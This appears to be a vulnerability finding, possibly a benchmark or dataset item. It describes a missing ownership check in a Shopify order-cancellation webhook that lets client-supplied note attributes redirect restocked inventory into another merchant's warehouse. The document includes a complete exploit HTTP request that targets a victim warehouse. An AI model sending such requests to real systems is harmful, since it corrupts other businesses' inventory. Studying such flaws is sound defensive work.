diagnosis: The Shopify webhook verifies the cryptographic HMAC signature, but restocks inventory into targetWarehouseId specified in client-supplied note_attributes without checking whether the Shopify merchant store owns the destination warehouse. An attacker can manipulate order cancellation notes during checkout to artificially inflate stock levels in competitor warehouses.
exploit_request:
POST /webhooks/shopify/orders-cancelled HTTP/1.1
Host: api.omnichannel-fulfillment.com
X-Shopify-Hmac-Sha256: valid_shopify_generated_base64_hmac==
Content-Type: application/json

{"id": 990142,"line_items": [{"sku": "PREMIUM-GPU-4090", "quantity": 100}],"note_attributes": [{"name": "restock_warehouse", "value": "wh_victim_san_jose"}]}
